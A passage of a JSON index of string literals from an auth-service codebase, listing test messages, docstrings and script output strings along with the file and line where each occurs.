      "category": "test_literals",
      "locations": [
        "auth_service/tests/unit/test_oauth_jwt_security_validator.py:104"
      ]
    },
    "Algorithm confusion attack with '": {
      "value": "Algorithm confusion attack with '",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/unit/test_oauth_jwt_security_validator.py:176"
      ]
    },
    "Align Test Imports and Configuration Script\nFixes all test-related import issues and configuration misalignments.": {
      "value": "Align Test Imports and Configuration Script\nFixes all test-related import issues and configuration misalignments.",
      "category": "test_literals",
      "locations": [
        "scripts/align_test_imports.py:2"
      ]
    },
    "All OAuth vars missing": {
      "value": "All OAuth vars missing",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_critical_oauth_environment_failures.py:170"
      ]
    },
    "All auth service instances failed to shut down gracefully - cascade failure": {
      "value": "All auth service instances failed to shut down gracefully - cascade failure",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_graceful_shutdown_failures.py:464"
      ]
    },
    "All configured": {
      "value": "All configured",
      "category": "test_literals",
      "locations": [
        "scripts/test_oauth_local.py:366"
      ]
    },
    "All critical imports successful!": {
      "value": "All critical imports successful!",
      "category": "test_literals",
      "locations": [
        "scripts/test_imports.py:95"
      ]
    },
    "All results should be boolean": {
      "value": "All results should be boolean",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_token_blacklisting_basics.py:258"
      ]
    },
    "All state parameters should be unique": {
      "value": "All state parameters should be unique",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/integration/test_oauth_state_csrf_vulnerability.py:213"
      ]
    },
    "All syntax errors fixed!": {
      "value": "All syntax errors fixed!",
      "category": "test_literals",
      "locations": [
        "scripts/fix_test_syntax_errors.py:268"
      ]
    },
    "All tests comply with real test requirements!": {
      "value": "All tests comply with real test requirements!",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/real_test_validator.py:266"
      ]
    },
    "All tests comply with requirements!": {
      "value": "All tests comply with requirements!",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/real_test_linter.py:187"
      ]
    },
    "All tests passed! The script is working correctly.": {
      "value": "All tests passed! The script is working correctly.",
      "category": "test_literals",
      "locations": [
        "scripts/test_verify_workflow.py:95"
      ]
    },
    "All tests validated successfully": {
      "value": "All tests validated successfully",
      "category": "test_literals",
      "locations": [
        "scripts/unified_test_runner.py:928"
      ]
    },
    "All tokens should be checked": {
      "value": "All tokens should be checked",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_token_blacklisting_basics.py:257"
      ]
    },
    "All unique hashes should verify correctly": {
      "value": "All unique hashes should verify correctly",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_password_hashing_basics.py:57"
      ]
    },
    "Allow production tests to run (requires explicit flag)": {
      "value": "Allow production tests to run (requires explicit flag)",
      "category": "test_literals",
      "locations": [
        "scripts/unified_test_runner.py:745"
      ]
    },
    "Allowed locations:": {
      "value": "Allowed locations:",
      "category": "test_literals",
      "locations": [
        "scripts/check_conftest_violations.py:94"
      ]
    },
    "Already in correct order": {
      "value": "Already in correct order",
      "category": "test_literals",
      "locations": [
        "scripts/fix_test_import_order.py:47"
      ]
    },
    "Analysis Complete:": {
      "value": "Analysis Complete:",
      "category": "test_literals",
      "locations": [
        "auth_service/test_actual_staging_credentials.py:171"
      ]
    },
    "Analysis complete. 3 optimization opportunities identified.": {
      "value": "Analysis complete. 3 optimization opportunities identified.",
      "category": "test_literals",
      "locations": [
        "netra_backend/app/services/realistic_test_data/llm_response_generator.py:213"
      ]
    },
    "Analysis complete. Suggested creating": {
      "value": "Analysis complete. Suggested creating",
      "category": "test_literals",
      "locations": [
        "scripts/auto_fix_test_violations.py:1005"
      ]
    },
    "Analysis failed:": {
      "value": "Analysis failed:",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/demo_test_size_enforcement.py:102"
      ]
    },
    "Analysis for": {
      "value": "Analysis for",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/test_refactor_helper.py:705"
      ]
    },
    "Analyze current test coverage": {
      "value": "Analyze current test coverage",
      "category": "test_literals",
      "locations": [
        "scripts/autonomous_review/test_reviewer.py:108"
      ]
    },
    "Analyze file for splitting": {
      "value": "Analyze file for splitting",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/test_refactor_helper.py:672"
      ]
    },
    "Analyze test mocks in the codebase to identify unjustified mocks.\nBased on testing.xml spectrum levels (L0-L5).": {
      "value": "Analyze test mocks in the codebase to identify unjustified mocks.\nBased on testing.xml spectrum levels (L0-L5).",
      "category": "test_literals",
      "locations": [
        "scripts/analyze_test_mocks.py:2"
      ]
    },
    "Analyze test reports in time range.": {
      "value": "Analyze test reports in time range.",
      "category": "test_literals",
      "locations": [
        "scripts/team_updates_test_analyzer.py:21"
      ]
    },
    "Analyze test size violations and generate improvement suggestions": {
      "value": "Analyze test size violations and generate improvement suggestions",
      "category": "test_literals",
      "locations": [
        "scripts/auto_fix_test_violations.py:916"
      ]
    },
    "Analyzing": {
      "value": "Analyzing",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/test_refactor_helper.py:73"
      ]
    },
    "Analyzing and suggesting fixes for": {
      "value": "Analyzing and suggesting fixes for",
      "category": "test_literals",
      "locations": [
        "scripts/auto_fix_test_violations.py:795"
      ]
    },
    "Analyzing large test file:": {
      "value": "Analyzing large test file:",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/demo_test_size_enforcement.py:84"
      ]
    },
    "Analyzing test pairs...": {
      "value": "Analyzing test pairs...",
      "category": "test_literals",
      "locations": [
        "scripts/analyze_test_overlap.py:259"
      ]
    },
    "Analyzing:": {
      "value": "Analyzing:",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/demo_test_size_enforcement.py:31"
      ]
    },
    "Anti-regression hook to prevent conftest.py violations.\nEnsures conftest.py files only exist at service-level directories.": {
      "value": "Anti-regression hook to prevent conftest.py violations.\nEnsures conftest.py files only exist at service-level directories.",
      "category": "test_literals",
      "locations": [
        "scripts/check_conftest_violations.py:2"
      ]
    },
    "App title should contain 'Auth Service', got:": {
      "value": "App title should contain 'Auth Service', got:",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_critical_staging_issues.py:180"
      ]
    },
    "Applied": {
      "value": "Applied",
      "category": "test_literals",
      "locations": [
        "scripts/batch_fix_and_test.py:106"
      ]
    },
    "Applying known fixes...": {
      "value": "Applying known fixes...",
      "category": "test_literals",
      "locations": [
        "scripts/batch_fix_and_test.py:104"
      ]
    },
    "Are you ABSOLUTELY SURE you want to proceed? Type 'YES I UNDERSTAND THE RISKS':": {
      "value": "Are you ABSOLUTELY SURE you want to proceed? Type 'YES I UNDERSTAND THE RISKS':",
      "category": "test_literals",
      "locations": [
        "scripts/auto_fix_test_violations.py:956"
      ]
    },
    "Argon2 hash should have at least 5 parts, got": {
      "value": "Argon2 hash should have at least 5 parts, got",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_password_hashing_basics.py:108"
      ]
    },
    "Assert Redis key was deleted": {
      "value": "Assert Redis key was deleted",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/base/test_mixins.py:135"
      ]
    },
    "Assert Redis key was set": {
      "value": "Assert Redis key was set",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/base/test_mixins.py:131"
      ]
    },
    "Assert session does not exist in database": {
      "value": "Assert session does not exist in database",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/base/test_mixins.py:61"
      ]
    },
    "Assert session exists in database": {
      "value": "Assert session exists in database",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/base/test_mixins.py:51"
      ]
    },
    "Assert session exists in database with expected values": {
      "value": "Assert session exists in database with expected values",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/utils/assertion_helpers.py:194"
      ]
    },
    "Assert user does not exist in database": {
      "value": "Assert user does not exist in database",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/base/test_mixins.py:41"
      ]
    },
    "Assert user exists in database with expected data": {
      "value": "Assert user exists in database with expected data",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/base/test_mixins.py:31"
      ]
    },
    "Assert user exists in database with expected values": {
      "value": "Assert user exists in database with expected values",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/utils/assertion_helpers.py:178"
      ]
    },
    "Assertion Helpers for Auth Service Tests\nCustom assertion functions for common auth testing scenarios.\nProvides clear and reusable assertions with detailed error messages.": {
      "value": "Assertion Helpers for Auth Service Tests\nCustom assertion functions for common auth testing scenarios.\nProvides clear and reusable assertions with detailed error messages.",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/utils/assertion_helpers.py:1"
      ]
    },
    "AssertionError": {
      "value": "AssertionError",
      "category": "test_literals",
      "locations": [
        "scripts/fix_test_batch.py:64",
        "scripts/fix_test_batch.py:65"
      ]
    },
    "AssertionHelpers": {
      "value": "AssertionHelpers",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/utils/__init__.py:19"
      ]
    },
    "Assess quality of existing tests": {
      "value": "Assess quality of existing tests",
      "category": "test_literals",
      "locations": [
        "scripts/autonomous_review/test_reviewer.py:138"
      ]
    },
    "Async URL has SSL:": {
      "value": "Async URL has SSL:",
      "category": "test_literals",
      "locations": [
        "scripts/test_ssl_certificates_staging.py:146"
      ]
    },
    "Async URL:": {
      "value": "Async URL:",
      "category": "test_literals",
      "locations": [
        "auth_service/test_url_construction.py:90",
        "scripts/test_auth_database_sessions.py:89",
        "scripts/test_database_url_builder_comprehensive.py:48",
        "scripts/test_database_url_builder_comprehensive.py:273",
        "scripts/test_ssl_certificates_staging.py:139",
        "scripts/test_ssl_certificates_staging.py:235"
      ]
    },
    "Async auth operations failed:": {
      "value": "Async auth operations failed:",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_auth_service_integration_reliability.py:123"
      ]
    },
    "Async setup - override in subclasses": {
      "value": "Async setup - override in subclasses",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/base/test_base.py:56"
      ]
    },
    "Async teardown - override in subclasses": {
      "value": "Async teardown - override in subclasses",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/base/test_base.py:60"
      ]
    },
    "AsyncMock()": {
      "value": "AsyncMock()",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/real_test_requirements_enforcer.py:356"
      ]
    },
    "AsyncMock\\(": {
      "value": "AsyncMock\\(",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/project_test_validator.py:273"
      ]
    },
    "AsyncMock\\(\\)": {
      "value": "AsyncMock\\(\\)",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/real_test_validator.py:235",
        "scripts/compliance/test_fixer.py:322"
      ]
    },
    "AsyncMock\\(spec=LLMManager\\)": {
      "value": "AsyncMock\\(spec=LLMManager\\)",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/test_fixer.py:320"
      ]
    },
    "AsyncTestBase": {
      "value": "AsyncTestBase",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/base/__init__.py:15"
      ]
    },
    "Attempt to automatically fix violations": {
      "value": "Attempt to automatically fix violations",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/real_test_linter.py:257"
      ]
    },
    "Attempting TCP connection with params:": {
      "value": "Attempting TCP connection with params:",
      "category": "test_literals",
      "locations": [
        "auth_service/test_staging_db_connection.py:99"
      ]
    },
    "Attempting connection with params:": {
      "value": "Attempting connection with params:",
      "category": "test_literals",
      "locations": [
        "auth_service/test_staging_db_connection.py:62"
      ]
    },
    "Attempting to connect to": {
      "value": "Attempting to connect to",
      "category": "test_literals",
      "locations": [
        "scripts/test_websocket_simple.py:15"
      ]
    },
    "Attempting to fix:": {
      "value": "Attempting to fix:",
      "category": "test_literals",
      "locations": [
        "scripts/automated_test_fix_loop.py:120"
      ]
    },
    "AttributeError": {
      "value": "AttributeError",
      "category": "test_literals",
      "locations": [
        "scripts/comprehensive_test_fixer.py:54",
        "scripts/fix_test_batch.py:55"
      ]
    },
    "AttributeError: '(\\w+)' object has no attribute '(\\w+)'": {
      "value": "AttributeError: '(\\w+)' object has no attribute '(\\w+)'",
      "category": "test_literals",
      "locations": [
        "scripts/fix_test_batch.py:53"
      ]
    },
    "AttributeError: <module '([\\w\\.]+)'.*> does not have the attribute '(\\w+)'": {
      "value": "AttributeError: <module '([\\w\\.]+)'.*> does not have the attribute '(\\w+)'",
      "category": "test_literals",
      "locations": [
        "scripts/comprehensive_test_fixer.py:50"
      ]
    },
    "Audit Log Test Data Factory\nCreates audit log entries for testing authentication events and security monitoring.\nSupports various event types with proper metadata and tracking.": {
      "value": "Audit Log Test Data Factory\nCreates audit log entries for testing authentication events and security monitoring.\nSupports various event types with proper metadata and tracking.",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/factories/audit_factory.py:1"
      ]
    },
    "AuditLogFactory": {
      "value": "AuditLogFactory",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/factories/__init__.py:20"
      ]
    },
    "Auth Database Engine Creation": {
      "value": "Auth Database Engine Creation",
      "category": "test_literals",
      "locations": [
        "scripts/test_auth_database_sessions.py:355"
      ]
    },
    "Auth Database Manager Import": {
      "value": "Auth Database Manager Import",
      "category": "test_literals",
      "locations": [
        "scripts/test_auth_database_sessions.py:353"
      ]
    },
    "Auth Database Session Lifecycle": {
      "value": "Auth Database Session Lifecycle",
      "category": "test_literals",
      "locations": [
        "scripts/test_auth_database_sessions.py:358"
      ]
    },
    "Auth Database Staging Integration": {
      "value": "Auth Database Staging Integration",
      "category": "test_literals",
      "locations": [
        "scripts/test_auth_database_sessions.py:357"
      ]
    },
    "Auth Database URL Conversion": {
      "value": "Auth Database URL Conversion",
      "category": "test_literals",
      "locations": [
        "scripts/test_auth_database_sessions.py:354"
      ]
    },
    "Auth Database URL Validation": {
      "value": "Auth Database URL Validation",
      "category": "test_literals",
      "locations": [
        "scripts/test_auth_database_sessions.py:356"
      ]
    },
    "Auth Endpoint:": {
      "value": "Auth Endpoint:",
      "category": "test_literals",
      "locations": [
        "scripts/test_auth_integration.py:52",
        "scripts/test_auth_integration.py:56"
      ]
    },
    "Auth Health": {
      "value": "Auth Health",
      "category": "test_literals",
      "locations": [
        "scripts/test_auth_integration.py:44"
      ]
    },
    "Auth Service": {
      "value": "Auth Service",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_critical_staging_issues.py:179",
        "scripts/test_async_postgres.py:171"
      ]
    },
    "Auth Service 500 error handling timeout - no resilience mechanism": {
      "value": "Auth Service 500 error handling timeout - no resilience mechanism",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/auth-service-down-critical-scenarios.py:159"
      ]
    },
    "Auth Service Actual Staging Credentials Test": {
      "value": "Auth Service Actual Staging Credentials Test",
      "category": "test_literals",
      "locations": [
        "auth_service/test_actual_staging_credentials.py:149"
      ]
    },
    "Auth Service Base Test Classes\nCommon test functionality and base classes for auth service testing": {
      "value": "Auth Service Base Test Classes\nCommon test functionality and base classes for auth service testing",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/base/__init__.py:1"
      ]
    },
    "Auth Service Database Connection Test": {
      "value": "Auth Service Database Connection Test",
      "category": "test_literals",
      "locations": [
        "auth_service/test_staging_db_connection.py:278"
      ]
    },
    "Auth Service Down Critical Scenarios - Iteration 2 Audit Findings\n\nThis test file specifically focuses on scenarios where the Auth Service is completely\ndown, unreachable, or failing, which is a major contributor to the authentication\nsystem failure identified in Iteration 2:\n\n**CRITICAL AUTH SERVICE DOWN SCENARIOS:**\n1. Auth Service completely unresponsive (no HTTP response)\n2. Auth Service returning 500 Internal Server Error\n3. Auth Service database connectivity lost\n4. Auth Service container/process crashed\n5. Auth Service overwhelmed with requests (503 Service Unavailable)\n6. Auth Service network partitioned from other services\n7. Auth Service SSL certificate expired\n8. Auth Service OAuth provider connectivity lost\n9. Auth Service Redis/cache layer down\n10. Auth Service graceful shutdown not working\n\n**EXPECTED TO FAIL**: These tests demonstrate what happens when Auth Service fails\nand expose the lack of fallback mechanisms causing system-wide authentication breakdown\n\nSystem Impact When Auth Service Down:\n- Frontend cannot authenticate users (100% authentication failure)\n- Backend cannot validate tokens (all requests rejected with 403)\n- No fallback authentication mechanisms\n- No cached authentication decisions\n- No graceful degradation\n- 6.2+ second timeouts waiting for unresponsive auth service\n\nRoot Causes (Auth Service Failures):\n- Single point of failure with no redundancy\n- No health checks or automatic recovery\n- No caching layer for authentication decisions  \n- No fallback to alternative authentication methods\n- Dependencies on external services without circuit breakers": {
      "value": "Auth Service Down Critical Scenarios - Iteration 2 Audit Findings\n\nThis test file specifically focuses on scenarios where the Auth Service is completely\ndown, unreachable, or failing, which is a major contributor to the authentication\nsystem failure identified in Iteration 2:\n\n**CRITICAL AUTH SERVICE DOWN SCENARIOS:**\n1. Auth Service completely unresponsive (no HTTP response)\n2. Auth Service returning 500 Internal Server Error\n3. Auth Service database connectivity lost\n4. Auth Service container/process crashed\n5. Auth Service overwhelmed with requests (503 Service Unavailable)\n6. Auth Service network partitioned from other services\n7. Auth Service SSL certificate expired\n8. Auth Service OAuth provider connectivity lost\n9. Auth Service Redis/cache layer down\n10. Auth Service graceful shutdown not working\n\n**EXPECTED TO FAIL**: These tests demonstrate what happens when Auth Service fails\nand expose the lack of fallback mechanisms causing system-wide authentication breakdown\n\nSystem Impact When Auth Service Down:\n- Frontend cannot authenticate users (100% authentication failure)\n- Backend cannot validate tokens (all requests rejected with 403)\n- No fallback authentication mechanisms\n- No cached authentication decisions\n- No graceful degradation\n- 6.2+ second timeouts waiting for unresponsive auth service\n\nRoot Causes (Auth Service Failures):\n- Single point of failure with no redundancy\n- No health checks or automatic recovery\n- No caching layer for authentication decisions  \n- No fallback to alternative authentication methods\n- Dependencies on external services without circuit breakers",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/auth-service-down-critical-scenarios.py:1"
      ]
    },
    "Auth Service Health": {
      "value": "Auth Service Health",
      "category": "test_literals",
      "locations": [
        "scripts/test_auth_integration.py:32",
        "scripts/test_auth_integration.py:36",
        "scripts/test_staging_deployment.py:85"
      ]
    },
    "Auth Service Integration Reliability Test.\n\nThis test validates that auth service integration is reliable and handles edge cases properly.": {
      "value": "Auth Service Integration Reliability Test.\n\nThis test validates that auth service integration is reliable and handles edge cases properly.",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_auth_service_integration_reliability.py:1"
      ]
    },
    "Auth Service Integration Tests": {
      "value": "Auth Service Integration Tests",
      "category": "test_literals",
      "locations": [
        "scripts/test_auth_integration.py:130"
      ]
    },
    "Auth Service Staging SSL Failure Tests\n\nSpecific failing tests for auth service SSL parameter issues in staging.\nThese tests reproduce the exact SSL parameter mismatches that cause\n\"unrecognized configuration parameter\" errors.\n\nQA Agent: Auth Service SSL Root Cause Analysis  \nCreated: 2025-08-24\nPurpose: Validate auth-specific SSL parameter handling failures": {
      "value": "Auth Service Staging SSL Failure Tests\n\nSpecific failing tests for auth service SSL parameter issues in staging.\nThese tests reproduce the exact SSL parameter mismatches that cause\n\"unrecognized configuration parameter\" errors.\n\nQA Agent: Auth Service SSL Root Cause Analysis  \nCreated: 2025-08-24\nPurpose: Validate auth-specific SSL parameter handling failures",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_staging_auth_ssl_failures.py:1"
      ]
    },
    "Auth Service Startup Integration Test\n\nTests the complete auth service startup process including:\n- Module import resolution\n- Database connectivity\n- Redis connectivity  \n- Configuration loading\n- Health endpoint functionality\n- Windows compatibility\n\nThis test verifies that the fixes for the dev launcher startup issues work correctly.": {
      "value": "Auth Service Startup Integration Test\n\nTests the complete auth service startup process including:\n- Module import resolution\n- Database connectivity\n- Redis connectivity  \n- Configuration loading\n- Health endpoint functionality\n- Windows compatibility\n\nThis test verifies that the fixes for the dev launcher startup issues work correctly.",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_auth_startup_integration.py:1"
      ]
    },
    "Auth Service Test Configuration Module\nTest configuration and environment management for auth service tests": {
      "value": "Auth Service Test Configuration Module\nTest configuration and environment management for auth service tests",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/config/__init__.py:1"
      ]
    },
    "Auth Service Test Database Module\nDatabase utilities for test isolation and management": {
      "value": "Auth Service Test Database Module\nDatabase utilities for test isolation and management",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/database/__init__.py:1"
      ]
    },
    "Auth Service Test Factories\nTest data factories for creating consistent test data.": {
      "value": "Auth Service Test Factories\nTest data factories for creating consistent test data.",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/factories/__init__.py:1"
      ]
    },
    "Auth Service Test Utilities\nHelper functions and utilities for auth service testing": {
      "value": "Auth Service Test Utilities\nHelper functions and utilities for auth service testing",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/utils/__init__.py:1"
      ]
    },
    "Auth Service URL Construction Test": {
      "value": "Auth Service URL Construction Test",
      "category": "test_literals",
      "locations": [
        "auth_service/test_url_construction.py:215"
      ]
    },
    "Auth Service became completely unresponsive due to database connectivity loss": {
      "value": "Auth Service became completely unresponsive due to database connectivity loss",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/auth-service-down-critical-scenarios.py:196"
      ]
    },
    "Auth Service becomes unresponsive when Redis cache layer is down": {
      "value": "Auth Service becomes unresponsive when Redis cache layer is down",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/auth-service-down-critical-scenarios.py:447"
      ]
    },
    "Auth Service crash recovery mechanism not implemented:": {
      "value": "Auth Service crash recovery mechanism not implemented:",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/auth-service-down-critical-scenarios.py:248"
      ]
    },
    "Auth Service crashes when Redis cache layer is down": {
      "value": "Auth Service crashes when Redis cache layer is down",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/auth-service-down-critical-scenarios.py:449"
      ]
    },
    "Auth Service hanging due to database connectivity loss": {
      "value": "Auth Service hanging due to database connectivity loss",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/auth-service-down-critical-scenarios.py:198"
      ]
    },
    "Auth Service should automatically restart after crash": {
      "value": "Auth Service should automatically restart after crash",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/auth-service-down-critical-scenarios.py:242"
      ]
    },
    "Auth Service should be new process after restart": {
      "value": "Auth Service should be new process after restart",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/auth-service-down-critical-scenarios.py:245"
      ]
    },
    "Auth Service should remain responsive with degraded database, got": {
      "value": "Auth Service should remain responsive with degraded database, got",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/auth-service-down-critical-scenarios.py:193"
      ]
    },
    "Auth Service should work without Redis, got": {
      "value": "Auth Service should work without Redis, got",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/auth-service-down-critical-scenarios.py:439"
      ]
    },
    "Auth Service: [green]✓ Healthy[/green]": {
      "value": "Auth Service: [green]✓ Healthy[/green]",
      "category": "test_literals",
      "locations": [
        "scripts/test_oauth_local.py:127"
      ]
    },
    "Auth Service: [red]✗ Not reachable -": {
      "value": "Auth Service: [red]✗ Not reachable -",
      "category": "test_literals",
      "locations": [
        "scripts/test_oauth_local.py:131"
      ]
    },
    "Auth Service: [red]✗ Unhealthy (": {
      "value": "Auth Service: [red]✗ Unhealthy (",
      "category": "test_literals",
      "locations": [
        "scripts/test_oauth_local.py:128"
      ]
    },
    "Auth Tests - Split from test_oauth_flows.py": {
      "value": "Auth Tests - Split from test_oauth_flows.py",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/integration/test_oauth_flows_auth.py:1"
      ]
    },
    "Auth URL: [cyan]": {
      "value": "Auth URL: [cyan]",
      "category": "test_literals",
      "locations": [
        "scripts/test_oauth_local.py:438"
      ]
    },
    "Auth async URL:": {
      "value": "Auth async URL:",
      "category": "test_literals",
      "locations": [
        "scripts/test_auth_database_sessions.py:247"
      ]
    },
    "Auth decorators not yet implemented": {
      "value": "Auth decorators not yet implemented",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_auth_service_integration_reliability.py:169"
      ]
    },
    "Auth instance": {
      "value": "Auth instance",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_graceful_shutdown_failures.py:453"
      ]
    },
    "Auth models import failed:": {
      "value": "Auth models import failed:",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_auth_service_integration_reliability.py:47"
      ]
    },
    "Auth must start before backend": {
      "value": "Auth must start before backend",
      "category": "test_literals",
      "locations": [
        "scripts/test_coordination_fixes.py:100"
      ]
    },
    "Auth routes import failed:": {
      "value": "Auth routes import failed:",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_auth_service_integration_reliability.py:150"
      ]
    },
    "Auth service URL": {
      "value": "Auth service URL",
      "category": "test_literals",
      "locations": [
        "scripts/test_auth_integration.py:171"
      ]
    },
    "Auth service URL not found": {
      "value": "Auth service URL not found",
      "category": "test_literals",
      "locations": [
        "scripts/test_cold_start_e2e.py:224"
      ]
    },
    "Auth service config import failed:": {
      "value": "Auth service config import failed:",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_auth_service_integration_reliability.py:94"
      ]
    },
    "Auth service exited early. Exit code:": {
      "value": "Auth service exited early. Exit code:",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_auth_startup_integration.py:87"
      ]
    },
    "Auth service failed to start": {
      "value": "Auth service failed to start",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_auth_startup_integration.py:194",
        "scripts/start_test_services.py:124"
      ]
    },
    "Auth service failure took": {
      "value": "Auth service failure took",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/auth-service-down-critical-scenarios.py:109"
      ]
    },
    "Auth service health check failed:": {
      "value": "Auth service health check failed:",
      "category": "test_literals",
      "locations": [
        "scripts/test_auth_integration.py:35"
      ]
    },
    "Auth service import failed:": {
      "value": "Auth service import failed:",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_auth_service_integration_reliability.py:27"
      ]
    },
    "Auth service main not available": {
      "value": "Auth service main not available",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_auth_service_integration_reliability.py:184"
      ]
    },
    "Auth service not available": {
      "value": "Auth service not available",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_auth_service_integration_reliability.py:121"
      ]
    },
    "Auth service process cleaned up": {
      "value": "Auth service process cleaned up",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_auth_startup_integration.py:175"
      ]
    },
    "Auth service request timeout after": {
      "value": "Auth service request timeout after",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/auth-service-down-critical-scenarios.py:119"
      ]
    },
    "Auth service responded when it should be down": {
      "value": "Auth service responded when it should be down",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/auth-service-down-critical-scenarios.py:102"
      ]
    },
    "Auth service specific test configuration.\nUses consolidated test framework infrastructure with auth-specific customizations.": {
      "value": "Auth service specific test configuration.\nUses consolidated test framework infrastructure with auth-specific customizations.",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/conftest.py:1"
      ]
    },
    "Auth service started successfully": {
      "value": "Auth service started successfully",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_auth_startup_integration.py:96"
      ]
    },
    "Auth service startup timed out": {
      "value": "Auth service startup timed out",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_auth_startup_integration.py:103"
      ]
    },
    "Auth should be able to start, missing:": {
      "value": "Auth should be able to start, missing:",
      "category": "test_literals",
      "locations": [
        "scripts/test_coordination_fixes.py:108"
      ]
    },
    "Auth should be in degraded services": {
      "value": "Auth should be in degraded services",
      "category": "test_literals",
      "locations": [
        "scripts/test_coordination_fixes.py:265"
      ]
    },
    "AuthConfig Integration": {
      "value": "AuthConfig Integration",
      "category": "test_literals",
      "locations": [
        "auth_service/test_url_construction.py:220"
      ]
    },
    "AuthConfig URL:": {
      "value": "AuthConfig URL:",
      "category": "test_literals",
      "locations": [
        "auth_service/test_url_construction.py:138"
      ]
    },
    "AuthConfig generated URL:": {
      "value": "AuthConfig generated URL:",
      "category": "test_literals",
      "locations": [
        "auth_service/test_staging_db_connection.py:175"
      ]
    },
    "AuthConfig integration test failed:": {
      "value": "AuthConfig integration test failed:",
      "category": "test_literals",
      "locations": [
        "auth_service/test_url_construction.py:149"
      ]
    },
    "AuthConfig should normalize DATABASE_URL": {
      "value": "AuthConfig should normalize DATABASE_URL",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_staging_auth_ssl_failures.py:215"
      ]
    },
    "AuthDatabaseManager imported successfully": {
      "value": "AuthDatabaseManager imported successfully",
      "category": "test_literals",
      "locations": [
        "scripts/test_auth_database_sessions.py:36"
      ]
    },
    "AuthDatabaseManager missing get_auth_database_url_async static method": {
      "value": "AuthDatabaseManager missing get_auth_database_url_async static method",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_critical_staging_issues.py:38"
      ]
    },
    "AuthDatabaseManager must have get_auth_database_url_async method": {
      "value": "AuthDatabaseManager must have get_auth_database_url_async method",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_auth_database_manager_missing_method.py:31"
      ]
    },
    "AuthDatabaseManager must have is_cloud_sql_environment method": {
      "value": "AuthDatabaseManager must have is_cloud_sql_environment method",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_auth_database_manager_missing_method.py:153"
      ]
    },
    "AuthDatabaseManager must have is_test_environment method": {
      "value": "AuthDatabaseManager must have is_test_environment method",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_auth_database_manager_missing_method.py:196"
      ]
    },
    "AuthDatabaseManager must have validate_auth_url method": {
      "value": "AuthDatabaseManager must have validate_auth_url method",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_auth_database_manager_missing_method.py:110"
      ]
    },
    "AuthDatabaseManager should detect problematic staging configuration": {
